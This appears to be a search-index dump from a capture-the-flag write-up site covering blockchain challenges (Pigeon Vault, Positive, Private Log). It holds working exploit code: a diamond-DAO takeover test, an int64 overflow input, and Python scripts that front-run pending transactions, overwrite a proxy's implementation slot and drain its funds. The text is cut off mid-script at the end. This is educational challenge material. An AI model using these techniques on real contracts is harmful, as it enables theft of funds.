); payable ( player ). transfer ( address ( this ). balance ); } } contract SolveTest is Test { Setup setup ; address pigeonDiamond ; uint constant privKey = 0xdead ; address immutable hacker = vm . addr ( privKey ); function setUp () public { setup = new Setup { value : 3000 ether }(); pigeonDiamond = address ( setup . pigeonDiamond ()); } function testSolve () public { vm . startPrank ( hacker ); address hackFacet = address ( new HackFacet ()); bytes4 [] memory selectors = new bytes4 []( 1 ); selectors [ 0 ] = bytes4 ( keccak256 ( \"exploit()\" )); IDiamondCut . FacetCut memory diamondCut = IDiamondCut . FacetCut ({ facetAddress : hackFacet , action : IDiamondCut . FacetCutAction . Add , functionSelectors : selectors }); IFTCFacet ( pigeonDiamond ). delegate ( hacker ); for ( uint8 i ; i < 11 ; ++ i ) { setup . claim (); } uint proposalId = IDAOFacet ( pigeonDiamond ). submitProposal ( hackFacet , abi . encodeWithSignature ( \"exploit(address)\" , hacker ), diamondCut ); ( uint8 v , bytes32 r , bytes32 s ) = vm . sign ( privKey , keccak256 ( \"\\x19Ethereum Signed Message:\\n32\" )); bytes memory signature = abi . encodePacked ( r , s , v ); vm . roll ( 2 ); IDAOFacet ( pigeonDiamond ). castVoteBySig ( proposalId , true , signature ); vm . roll ( 10 ); IDAOFacet ( pigeonDiamond ). executeProposal ( proposalId ); assert ( setup . isSolved ()); vm . stopPrank (); } }","title":"Exploit"},{"location":"blockchain/pigeon_vault/#flag","text":"SEE{D14m0nd5_st0rAg3_4nd_P1g30nS_d0n\u2019t_g0_w311_t0G37h3r_B1lnG_bl1ng_bed2cbc16cbfca78f6e7d73ae2ac987f}","title":"Flag"},{"location":"blockchain/positive/","tags":["smart contract","fuzzing"],"text":"#smart contract #fuzzing .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } Description \u00b6 Stay positive. nc positive.chal.crewc.tf 60003 Setup.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 pragma solidity = 0.7.6 ; import \"./Positive.sol\" ; contract Setup { Positive public immutable TARGET ; constructor () payable { TARGET = new Positive (); } function isSolved () public view returns ( bool ) { return TARGET . solved (); } } Positive.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 // SPDX-License-Identifier: MIT pragma solidity = 0.7.6 ; contract Positive { bool public solved ; constructor () { solved = false ; } function stayPositive ( int64 _num ) public returns ( int64 ){ int64 num ; if ( _num < 0 ){ num = - _num ; if ( num < 0 ){ solved = true ; } return num ; } num = _num ; return num ; } } Solution \u00b6 We need to find a number of type int64 that is less than 0, and its opposite is also negative 1 2 3 4 5 6 7 8 9 10 11 12 function stayPositive ( int64 _num ) public returns ( int64 ){ int64 num ; if ( _num < 0 ){ num = - _num ; if ( num < 0 ){ solved = true ; } return num ; } num = _num ; return num ; } If you have int x = type(int).min; , then -x does not fit the positive range. This means that unchecked { assert(-x == x); } works 1 As int64 type values range from -9223372036854775808 to 9223372036854775807, the answer will be -9223372036854775808 During the competition, I used fuzzing to get the answer uwu 1 2 3 4 5 6 7 8 9 10 11 12 13 14 contract PositiveTest is Test { Setup setup ; Positive target ; function setUp () public { setup = new Setup (); target = setup . TARGET (); } function testSolve ( int64 a ) public { target . stayPositive ( a ); assert ( ! target . solved ()); } } 1 2 3 Failing tests: Encountered 1 failing test in test/Positive.t.sol:PositiveTest [ FAIL. Reason: EvmError: InvalidFEOpcode Counterexample: calldata = 0xecd6eb4fffffffffffffffffffffffffffffffffffffffffffffffff8000000000000000, args =[ -9223372036854775808 ]] testSolve ( int64 ) ( runs: 66 , \u03bc: 8924 , ~: 8925 ) Flag \u00b6 crew{9o5it1v1ty1sth3k3y} Addition, Subtraction and Multiplication \u21a9","title":"positive"},{"location":"blockchain/positive/#description","text":"Stay positive. nc positive.chal.crewc.tf 60003 Setup.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 pragma solidity = 0.7.6 ; import \"./Positive.sol\" ; contract Setup { Positive public immutable TARGET ; constructor () payable { TARGET = new Positive (); } function isSolved () public view returns ( bool ) { return TARGET . solved (); } } Positive.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 // SPDX-License-Identifier: MIT pragma solidity = 0.7.6 ; contract Positive { bool public solved ; constructor () { solved = false ; } function stayPositive ( int64 _num ) public returns ( int64 ){ int64 num ; if ( _num < 0 ){ num = - _num ; if ( num < 0 ){ solved = true ; } return num ; } num = _num ; return num ; } }","title":"Description"},{"location":"blockchain/positive/#solution","text":"We need to find a number of type int64 that is less than 0, and its opposite is also negative 1 2 3 4 5 6 7 8 9 10 11 12 function stayPositive ( int64 _num ) public returns ( int64 ){ int64 num ; if ( _num < 0 ){ num = - _num ; if ( num < 0 ){ solved = true ; } return num ; } num = _num ; return num ; } If you have int x = type(int).min; , then -x does not fit the positive range. This means that unchecked { assert(-x == x); } works 1 As int64 type values range from -9223372036854775808 to 9223372036854775807, the answer will be -9223372036854775808 During the competition, I used fuzzing to get the answer uwu 1 2 3 4 5 6 7 8 9 10 11 12 13 14 contract PositiveTest is Test { Setup setup ; Positive target ; function setUp () public { setup = new Setup (); target = setup . TARGET (); } function testSolve ( int64 a ) public { target . stayPositive ( a ); assert ( ! target . solved ()); } } 1 2 3 Failing tests: Encountered 1 failing test in test/Positive.t.sol:PositiveTest [ FAIL. Reason: EvmError: InvalidFEOpcode Counterexample: calldata = 0xecd6eb4fffffffffffffffffffffffffffffffffffffffffffffffff8000000000000000, args =[ -9223372036854775808 ]] testSolve ( int64 ) ( runs: 66 , \u03bc: 8924 , ~: 8925 )","title":"Solution"},{"location":"blockchain/positive/#flag","text":"crew{9o5it1v1ty1sth3k3y} Addition, Subtraction and Multiplication \u21a9","title":"Flag"},{"location":"blockchain/private_log/","tags":["smart contract","proxy contract"],"text":"#smart contract #proxy contract .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } \u9898\u76ee \u00b6 I thought I would try and save some gas by updating my log entries with assembly, I'm not super sure if it's safe, but I have added a password for good measure. But it's okay because if there is a bug I can always upgrade since I'm using the TransparentUpgradeableProxy pattern :). I love my creation so much that I add a new log every minute! Note the block time on this challenge is 23 seconds, so there will a delay in deploying and resetting the challenge. Goal: Steal all funds from the contract. PrivateLog.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; /** * @title Private Log * @author Blue Alder (https://duc.tf) **/ import \"OpenZeppelin/openzeppelin-contracts@4.3.2/contracts/proxy/utils/Initializable.sol\" ; contract PrivateLog is Initializable { bytes32 public secretHash ; string [] public logEntries ; constructor () { secretHash = 0xDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEAD ; } function init ( bytes32 _secretHash ) payable public initializer { require ( secretHash != 0xDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEAD ); secretHash = _secretHash ; } modifier hasSecret ( string memory password , bytes32 newHash ) { require ( keccak256 ( abi . encodePacked ( password )) == secretHash , \"Incorrect Hash\" ); secretHash = newHash ; _ ; } function viewLog ( uint256 logIndex ) view public returns ( string memory ) { return logEntries [ logIndex ]; } function createLogEntry ( string memory logEntry , string memory password , bytes32 newHash ) public hasSecret ( password , newHash ) { require ( bytes ( logEntry ). length <= 31 , \"log too long\" ); assembly { mstore ( 0x00 , logEntries . slot ) let length := sload ( logEntries . slot ) let logLength := mload ( logEntry ) sstore ( add ( keccak256 ( 0x00 , 0x20 ), length ), or ( mload ( add ( logEntry , 0x20 )), mul ( logLength , 2 ))) sstore ( logEntries . slot , add ( length , 1 )) } } function updateLogEntry ( uint256 logIndex , string memory logEntry , string memory password , bytes32 newHash ) public hasSecret ( password , newHash ) { require ( bytes ( logEntry ). length <= 31 , \"log too long\" ); assembly { let length := mload ( logEntry ) mstore ( 0x00 , logEntries . slot ) sstore ( add ( keccak256 ( 0x00 , 0x20 ), logIndex ), or ( mload ( add ( logEntry , 0x20 )), mul ( length , 2 ))) } } } \u89e3\u9898\u601d\u8def \u00b6 \u76ee\u6807\u662f\u8f6c\u79fb\u5408\u7ea6\u7684\u6240\u6709\u8d44\u91d1\uff0c\u4f46\u662f PrivateLog \u4e2d\u5e76\u6ca1\u6709\u76f8\u5173\u7684\u51fd\u6570 \u9898\u76ee\u63cf\u8ff0\u4e2d\u63d0\u5230\u4e86\u5408\u7ea6 TransparentUpgradeableProxy \uff0c\u975e\u7ba1\u7406\u5458\u8c03\u7528\u4ee3\u7406\u5408\u7ea6\u5c06 fallback \u5230\u903b\u8f91\u5408\u7ea6\uff0c\u4ee3\u7406\u5408\u7ea6\u4f7f\u7528\u903b\u8f91\u5408\u7ea6\u7684\u4ee3\u7801\uff0c\u800c\u5176\u4ed6\u5c5e\u6027\u5219\u5b58\u50a8\u5728\u4ee3\u7406\u5408\u7ea6\u5185\u3002\u53ef\u5347\u7ea7\u610f\u5473\u7740\u903b\u8f91\u5408\u7ea6\u662f\u53ef\u4ee5\u66f4\u6539\u7684 \u901a\u8fc7\u67e5\u770b\u4f59\u989d\u53ef\u4ee5\u786e\u8ba4\u5b9e\u9645\u4e0a\u9700\u8981\u8f6c\u79fb\u7684\u662f\u4ee3\u7406\u5408\u7ea6\u7684\u8d44\u91d1\uff0c\u90a3\u4e48\u663e\u7136\u9700\u8981\u66f4\u6539\u4ee3\u7406\u5408\u7ea6\u4e2d\u903b\u8f91\u5408\u7ea6\u7684\u5730\u5740\uff0c\u4ece\u800c\u80fd\u591f\u901a\u8fc7\u65b0\u7684\u903b\u8f91\u5408\u7ea6\u6765\u8f6c\u79fb\u8d44\u91d1 TransparentUpgradeableProxy \u4e2d\u903b\u8f91\u5408\u7ea6\u7684\u5730\u5740\u5b58\u50a8\u5728\u56fa\u5b9a\u7684\u4f4d\u7f6e _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc 1 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 from web3 import Web3 from web3.middleware import geth_poa_middleware import requests , json base_id = 'fd313a3613eb393b' w3 = Web3 ( Web3 . HTTPProvider ( f \"https://blockchain-privatelog- { base_id } -eth.2022.ductf.dev\" )) w3 . middleware_onion . inject ( geth_poa_middleware , layer = 0 ) info = json . loads ( requests . get ( f 'https://blockchain-privatelog- { base_id } .2022.ductf.dev/challenge' ) . content ) account = w3 . eth . account . from_key ( info [ 'player_wallet' ][ 'private_key' ]) log_addr = info [ 'contract_address' ][ 0 ][ 'address' ] proxy_addr = info [ 'contract_address' ][ 1 ][ 'address' ] print ( w3 . eth . get_balance ( log_addr )) print ( w3 . eth . get_balance ( proxy_addr )) # 0 # 100000000000000000000 updateLogEntry() \u4e0d\u68c0\u67e5 logIndex \uff0c\u800c sstore(addr, val) \u53ef\u4ee5\u5c06 val \u5199\u5165 addr \uff0c\u53ef\u4ee5\u501f\u6b64\u6765\u4fee\u6539\u903b\u8f91\u5408\u7ea6\u7684\u5730\u5740 keccak256(p, n) \u5373 keccak(mem[p\u2026(p+n))) \uff0c mem[0, 20) \u5bf9\u5e94 logEntries.slot \uff0c\u90a3\u4e48 keccak256(0x00, 0x20) \u5373 keccak(2) \uff08slot 0 Initializable \u7684\u53d8\u91cf\uff0cslot 1 secretHash \uff09 keccak256(2) \u5927\u4e8e _IMPLEMENTATION_SLOT \uff0c\u9700\u8981\u4fee\u6539\u7684 logIndex \u4e3a \\(2^{256}\\) - keccak256(2) + _IMPLEMENTATION_SLOT \u4e0d\u8fc7\uff0c logEntry \u4e3a string \u7c7b\u578b\uff0c\u5b58\u50a8\u65b9\u5f0f\u4e0e address \u4e0d\u540c \u82e5\u5b57\u7b26\u4e32\u957f\u5ea6\u4e0d\u8d85\u8fc7 31 \u5b57\u8282\uff0c\u5c06\u4ee5 higher-order \u5b58\u50a8\uff0c\u4e14\u6700\u4f4e\u5b57\u8282\u5b58\u50a8 length * 2 \uff0c\u5982\u5b57\u7b26\u4e32 hello \u5c06\u5b58\u50a8\u4e3a 0x68656c6c6f00000000000000000000000000000000000000000000000000000a \uff0c\u800c\u5730\u5740\u7c7b\u578b\u4ee5 lower-order \u5b58\u50a8 logEntry \u6700\u957f\u652f\u6301 31 \u5b57\u8282\uff0c\u90a3\u4e48\u6700\u4f4e\u5b57\u8282\u662f 0x3e \uff0c\u56e0\u6b64\u7528\u4e8e\u8f6c\u79fb\u8d44\u91d1\u7684\u903b\u8f91\u5408\u7ea6\u5730\u5740\u6700\u540e 1 \u5b57\u8282\u5e94\u4e3a 0x3e \u63a5\u4e0b\u6765\u8003\u8651\u5982\u4f55\u83b7\u5f97 updateLogEntry() \u7684\u63a7\u5236\u6743\u3002\u65e0\u8bba createLogEntry() \u6216 updateLogEntry() \u90fd\u9700\u8981\u77e5\u9053\u5f53\u524d\u7684\u5bc6\u7801\uff0c\u5e76\u4f20\u5165\u65b0\u5bc6\u7801\u7684\u54c8\u5e0c\u3002\u4f46 owner \u6bcf\u5206\u949f\u90fd\u4f1a\u8c03\u7528 createLogEntry() \uff0c\u800c\u6bcf 23s \u624d\u4ea7\u751f\u4e00\u4e2a\u65b0\u533a\u5757\uff0c\u53ef\u4ee5\u901a\u8fc7 pending \u7684\u4ea4\u6613\u83b7\u5f97\u5bc6\u7801\uff0c\u5e76\u4ee5\u66f4\u9ad8\u7684\u6c7d\u6cb9\u8d39\u53d6\u5f97\u4f18\u5148\u5199\u5165\u6743\uff0c\u4ece\u800c\u80fd\u591f\u4f7f\u7528 updateLogEntry() Exploit \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 from web3 import Web3 from web3.middleware import geth_poa_middleware from eth_abi import decode_abi from eth_utils import keccak , to_bytes , to_checksum_address from solcx import compile_source import requests , json , rlp def transact ( func , gas = 1000000 , gas_price = None ): tx = account . sign_transaction ( eval ( func ) . buildTransaction ({ 'chainId' : w3 . eth . chain_id , 'nonce' : w3 . eth . get_transaction_count ( account . address ), 'gas' : gas , 'gasPrice' : gas_price if gas_price else w3 . eth . gas_price , })) . rawTransaction tx_hash = w3 . eth . send_raw_transaction ( tx ) . hex () return w3 . eth . wait_for_transaction_receipt ( tx_hash ) base_id = 'fd313a3613eb393b' w3 = Web3 ( Web3 . HTTPProvider ( f \"https://blockchain-privatelog- { base_id } -eth.2022.ductf.dev\" )) w3 . middleware_onion . inject ( geth_poa_middleware , layer = 0 ) info = json . loads ( requests . get ( f 'https://blockchain-privatelog- { base_id } .2022.ductf.dev/challenge' ) . content ) account = w3 . eth . account . from_key ( info [ 'player_wallet' ][ 'private_key' ]) log_addr = info [ 'contract_address' ][ 0 ][ 'address' ] proxy_addr = info [ 'contract_address' ][ 1 ][ 'address' ] log_abi = open ( 'abi.json' ) . read () contract_log = w3 . eth . contract ( address = proxy_addr , abi = log_abi ) tx_filter = w3 . eth . filter ( 'pending' ) newHash = w3 . solidityKeccak ([ 'string' ], [ 'password' ]) while True : if tx_hashes := tx_filter . get_new_entries (): tx = w3 . eth . get_transaction ( tx_hashes [ 0 ]) logEntry , password , _ = decode_abi ([ 'string' , 'string' , 'bytes32' ], bytes . fromhex ( tx . input [ 10 :])) transact ( \"contract_log.functions.createLogEntry('under the control', password, newHash)\" , gas_price = w3 . eth . gas_price + 100 ) break curr_nonce = w3 . eth . get_transaction_count ( account . address ) target_nonce = curr_nonce sender_bytes = to_bytes ( hexstr = account . address ) while True : addr_bytes = keccak ( rlp . encode ([ sender_bytes , target_nonce ]))[ 12 :] target_address = to_checksum_address ( addr_bytes ) if int ( target_address [ - 2 :], 16 ) == 0x3e : break target_nonce += 1 _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc logIndex = 2 ** 256 - int ( w3 . solidityKeccak ([ 'uint256' ], [ 2 ]) . hex (), 16 ) + _IMPLEMENTATION_SLOT logEntry = f \" { int ( target_address , 16 ) : 064x } \" [: - 2 ] tx = contract_log . functions . updateLogEntry ( logIndex , 'A' * 31 , 'password' , newHash ) . build_transaction ({ 'chainId' : w3 . eth . chain_id , 'nonce' : w3 . eth . get_transaction_count ( account . address ), 'gas' : 1000000 , 'gasPrice' : w3 . eth . gas_price , }) tx [ 'data' ] = tx [ 'data' ] . replace ( '41' * 31 , logEntry ) # \u53ef\u80fd\u5b58\u5728 UTF-8 \u65e0\u6cd5\u7f16\u7801\u7684\u5b57\u7b26\uff0c\u56e0\u6b64\u4e0d\u76f4\u63a5\u4f20\u5165 logEntry\uff0c\u800c\u662f\u91c7\u7528\u66ff\u6362\u7684\u65b9\u5f0f tx_hash = w3 . eth . send_raw_transaction ( account . sign_transaction ( tx ) . rawTransaction ) . hex () w3 . eth . wait_for_transaction_receipt ( tx_hash ) print ( w3 . eth . getStorageAt ( proxy_addr , _IMPLEMENTATION_SLOT ) . hex ()) curr_nonce = w3 . eth . get_transaction_count ( account . address ) while target_nonce > curr_nonce : transact ( \"contract_log.functions.createLogEntry('under the control', 'password', newHash)\" ) curr_nonce += 1 hack_source = \"\"\" // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Hack { function steal() public { payable(msg.sender).transfer(100 ether); } } \"\"\" _ , hack_interface = compile_source ( hack_source ) . popitem () hack_contract = w3 . eth . contract ( abi = hack_interface [ 'abi' ], bytecode = hack_interface [ 'bin' ]) print ( transact ( \"hack_contract.constructor()\" , gas = hack_contract . constructor () . estimateGas () * 2 ) . contractAddress ) contract_hack = w3 . eth . contract ( address = proxy_addr , abi = hack_interface [ 'abi' ]) transact ( \"contract_hack.functions.steal()\" ) print ( requests . get ( f 'https://blockchain-privatelog- { base_id } .2022.ductf.dev/challenge/solve' ) . content ) Flag \u00b6 DUCTF{first_i_steal_ur_tx_then_I_steal_ur_proxy_then_i_steal_ur_funds} ERC1967Upgrade - _IMPLEMENTATION_SLOT \u21a9","title":"Private Log"},{"location":"blockchain/private_log/#_1","text":"I thought I would try and save some gas by updating my log entries with assembly, I'm not super sure if it's safe, but I have added a password for good measure. But it's okay because if there is a bug I can always upgrade since I'm using the TransparentUpgradeableProxy pattern :). I love my creation so much that I add a new log every minute! Note the block time on this challenge is 23 seconds, so there will a delay in deploying and resetting the challenge. Goal: Steal all funds from the contract. PrivateLog.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; /** * @title Private Log * @author Blue Alder (https://duc.tf) **/ import \"OpenZeppelin/openzeppelin-contracts@4.3.2/contracts/proxy/utils/Initializable.sol\" ; contract PrivateLog is Initializable { bytes32 public secretHash ; string [] public logEntries ; constructor () { secretHash = 0xDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEAD ; } function init ( bytes32 _secretHash ) payable public initializer { require ( secretHash != 0xDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEAD ); secretHash = _secretHash ; } modifier hasSecret ( string memory password , bytes32 newHash ) { require ( keccak256 ( abi . encodePacked ( password )) == secretHash , \"Incorrect Hash\" ); secretHash = newHash ; _ ; } function viewLog ( uint256 logIndex ) view public returns ( string memory ) { return logEntries [ logIndex ]; } function createLogEntry ( string memory logEntry , string memory password , bytes32 newHash ) public hasSecret ( password , newHash ) { require ( bytes ( logEntry ). length <= 31 , \"log too long\" ); assembly { mstore ( 0x00 , logEntries . slot ) let length := sload ( logEntries . slot ) let logLength := mload ( logEntry ) sstore ( add ( keccak256 ( 0x00 , 0x20 ), length ), or ( mload ( add ( logEntry , 0x20 )), mul ( logLength , 2 ))) sstore ( logEntries . slot , add ( length , 1 )) } } function updateLogEntry ( uint256 logIndex , string memory logEntry , string memory password , bytes32 newHash ) public hasSecret ( password , newHash ) { require ( bytes ( logEntry ). length <= 31 , \"log too long\" ); assembly { let length := mload ( logEntry ) mstore ( 0x00 , logEntries . slot ) sstore ( add ( keccak256 ( 0x00 , 0x20 ), logIndex ), or ( mload ( add ( logEntry , 0x20 )), mul ( length , 2 ))) } } }","title":"\u9898\u76ee"},{"location":"blockchain/private_log/#_2","text":"\u76ee\u6807\u662f\u8f6c\u79fb\u5408\u7ea6\u7684\u6240\u6709\u8d44\u91d1\uff0c\u4f46\u662f PrivateLog \u4e2d\u5e76\u6ca1\u6709\u76f8\u5173\u7684\u51fd\u6570 \u9898\u76ee\u63cf\u8ff0\u4e2d\u63d0\u5230\u4e86\u5408\u7ea6 TransparentUpgradeableProxy \uff0c\u975e\u7ba1\u7406\u5458\u8c03\u7528\u4ee3\u7406\u5408\u7ea6\u5c06 fallback \u5230\u903b\u8f91\u5408\u7ea6\uff0c\u4ee3\u7406\u5408\u7ea6\u4f7f\u7528\u903b\u8f91\u5408\u7ea6\u7684\u4ee3\u7801\uff0c\u800c\u5176\u4ed6\u5c5e\u6027\u5219\u5b58\u50a8\u5728\u4ee3\u7406\u5408\u7ea6\u5185\u3002\u53ef\u5347\u7ea7\u610f\u5473\u7740\u903b\u8f91\u5408\u7ea6\u662f\u53ef\u4ee5\u66f4\u6539\u7684 \u901a\u8fc7\u67e5\u770b\u4f59\u989d\u53ef\u4ee5\u786e\u8ba4\u5b9e\u9645\u4e0a\u9700\u8981\u8f6c\u79fb\u7684\u662f\u4ee3\u7406\u5408\u7ea6\u7684\u8d44\u91d1\uff0c\u90a3\u4e48\u663e\u7136\u9700\u8981\u66f4\u6539\u4ee3\u7406\u5408\u7ea6\u4e2d\u903b\u8f91\u5408\u7ea6\u7684\u5730\u5740\uff0c\u4ece\u800c\u80fd\u591f\u901a\u8fc7\u65b0\u7684\u903b\u8f91\u5408\u7ea6\u6765\u8f6c\u79fb\u8d44\u91d1 TransparentUpgradeableProxy \u4e2d\u903b\u8f91\u5408\u7ea6\u7684\u5730\u5740\u5b58\u50a8\u5728\u56fa\u5b9a\u7684\u4f4d\u7f6e _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc 1 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 from web3 import Web3 from web3.middleware import geth_poa_middleware import requests , json base_id = 'fd313a3613eb393b' w3 = Web3 ( Web3 . HTTPProvider ( f \"https://blockchain-privatelog- { base_id } -eth.2022.ductf.dev\" )) w3 . middleware_onion . inject ( geth_poa_middleware , layer = 0 ) info = json . loads ( requests . get ( f 'https://blockchain-privatelog- { base_id } .2022.ductf.dev/challenge' ) . content ) account = w3 . eth . account . from_key ( info [ 'player_wallet' ][ 'private_key' ]) log_addr = info [ 'contract_address' ][ 0 ][ 'address' ] proxy_addr = info [ 'contract_address' ][ 1 ][ 'address' ] print ( w3 . eth . get_balance ( log_addr )) print ( w3 . eth . get_balance ( proxy_addr )) # 0 # 100000000000000000000 updateLogEntry() \u4e0d\u68c0\u67e5 logIndex \uff0c\u800c sstore(addr, val) \u53ef\u4ee5\u5c06 val \u5199\u5165 addr \uff0c\u53ef\u4ee5\u501f\u6b64\u6765\u4fee\u6539\u903b\u8f91\u5408\u7ea6\u7684\u5730\u5740 keccak256(p, n) \u5373 keccak(mem[p\u2026(p+n))) \uff0c mem[0, 20) \u5bf9\u5e94 logEntries.slot \uff0c\u90a3\u4e48 keccak256(0x00, 0x20) \u5373 keccak(2) \uff08slot 0 Initializable \u7684\u53d8\u91cf\uff0cslot 1 secretHash \uff09 keccak256(2) \u5927\u4e8e _IMPLEMENTATION_SLOT \uff0c\u9700\u8981\u4fee\u6539\u7684 logIndex \u4e3a \\(2^{256}\\) - keccak256(2) + _IMPLEMENTATION_SLOT \u4e0d\u8fc7\uff0c logEntry \u4e3a string \u7c7b\u578b\uff0c\u5b58\u50a8\u65b9\u5f0f\u4e0e address \u4e0d\u540c \u82e5\u5b57\u7b26\u4e32\u957f\u5ea6\u4e0d\u8d85\u8fc7 31 \u5b57\u8282\uff0c\u5c06\u4ee5 higher-order \u5b58\u50a8\uff0c\u4e14\u6700\u4f4e\u5b57\u8282\u5b58\u50a8 length * 2 \uff0c\u5982\u5b57\u7b26\u4e32 hello \u5c06\u5b58\u50a8\u4e3a 0x68656c6c6f00000000000000000000000000000000000000000000000000000a \uff0c\u800c\u5730\u5740\u7c7b\u578b\u4ee5 lower-order \u5b58\u50a8 logEntry \u6700\u957f\u652f\u6301 31 \u5b57\u8282\uff0c\u90a3\u4e48\u6700\u4f4e\u5b57\u8282\u662f 0x3e \uff0c\u56e0\u6b64\u7528\u4e8e\u8f6c\u79fb\u8d44\u91d1\u7684\u903b\u8f91\u5408\u7ea6\u5730\u5740\u6700\u540e 1 \u5b57\u8282\u5e94\u4e3a 0x3e \u63a5\u4e0b\u6765\u8003\u8651\u5982\u4f55\u83b7\u5f97 updateLogEntry() \u7684\u63a7\u5236\u6743\u3002\u65e0\u8bba createLogEntry() \u6216 updateLogEntry() \u90fd\u9700\u8981\u77e5\u9053\u5f53\u524d\u7684\u5bc6\u7801\uff0c\u5e76\u4f20\u5165\u65b0\u5bc6\u7801\u7684\u54c8\u5e0c\u3002\u4f46 owner \u6bcf\u5206\u949f\u90fd\u4f1a\u8c03\u7528 createLogEntry() \uff0c\u800c\u6bcf 23s \u624d\u4ea7\u751f\u4e00\u4e2a\u65b0\u533a\u5757\uff0c\u53ef\u4ee5\u901a\u8fc7 pending \u7684\u4ea4\u6613\u83b7\u5f97\u5bc6\u7801\uff0c\u5e76\u4ee5\u66f4\u9ad8\u7684\u6c7d\u6cb9\u8d39\u53d6\u5f97\u4f18\u5148\u5199\u5165\u6743\uff0c\u4ece\u800c\u80fd\u591f\u4f7f\u7528 updateLogEntry()","title":"\u89e3\u9898\u601d\u8def"},{"location":"blockchain/private_log/#exploit","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 from web3 import Web3 from web3.middleware import geth_poa_middleware from eth_abi import decode_abi from eth_utils import keccak , to_bytes , to_checksum_address from solcx import compile_source import requests , json , rlp def transact ( func , gas = 1000000 , gas_price = None ): tx = account . sign_transaction ( eval ( func ) . buildTransaction ({ 'chainId' : w3 . eth . chain_id , 'nonce' : w3 . eth . get_transaction_count ( account . address ), 'gas' : gas , 'gasPrice' : gas_price if gas_price else w3 . eth . gas_price , })) . rawTransaction tx_hash = w3 . eth . send_raw_transaction ( tx ) . hex () return w3 . eth . wait_for_transaction_receipt ( tx_hash ) base_id = 'fd313a3613eb393b' w3 = Web3 ( Web3 . HTTPProvider ( f \"https://blockchain-privatelog- { base_id } -eth.2022.ductf.dev\" )) w3 . middleware_onion . inject ( geth_poa_middleware , layer = 0 ) info = json . loads ( requests . get ( f 'https://blockchain-privatelog- { base_id } .2022.ductf.dev/challenge' ) . content ) account = w3 . eth . account . from_key ( info [ 'player_wallet' ][ 'private_key' ]) log_addr = info [ 'contract_address' ][ 0 ][ 'address' ] proxy_addr = info [ 'contract_address' ][ 1 ][ 'address' ] log_abi = open ( 'abi.json' ) . read () contract_log = w3 . eth . contract ( address = proxy_addr , abi = log_abi ) tx_filter = w3 . eth . filter ( 'pending' ) newHash = w3 . solidityKeccak ([ 'string' ], [ 'password' ]) while True : if tx_hashes := tx_filter . get_new_entries (): tx = w3 . eth . get_transaction ( tx_hashes [ 0 ]) logEntry , password , _ = decode_abi ([ 'string' , 'string' , 'bytes32' ], bytes . fromhex ( tx . input [ 10 :])) transact ( \"contract_log.functions.createLogEntry('under the control', password, newHash)\" , gas_price = w3 . eth . gas_price + 100 ) break curr_nonce = w3 . eth . get_transaction_count ( account . address ) target_nonce = curr_nonce sender_bytes = to_bytes ( hexstr = account . address ) while True : addr_bytes = keccak ( rlp . encode ([ sender_bytes , target_nonce ]))[ 12 :] target_address = to_checksum_address ( addr_bytes ) if int ( target_address [ - 2 :], 16 ) == 0x3e : break target_nonce += 1 _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc logIndex = 2 ** 256 - int ( w3 . solidityKeccak ([ 'uint256' ], [ 2 ]) . hex (), 16 ) + _IMPLEMENTATION_SLOT logEntry = f \" { int ( target_address , 16 ) : 064x } \" [: - 2 ] tx = contract_log . functions . updateLogEntry ( logIndex , 'A' * 31 , 'password' , newHash ) . build_transaction ({ 'chainId' : w3 . eth . chain_id , 'nonce' : w3 . eth . get_transaction_count ( account . address ), 'gas' : 1000000 , 'gasPrice' : w3 . eth . gas_price , }) tx [ 'data' ] = tx [ 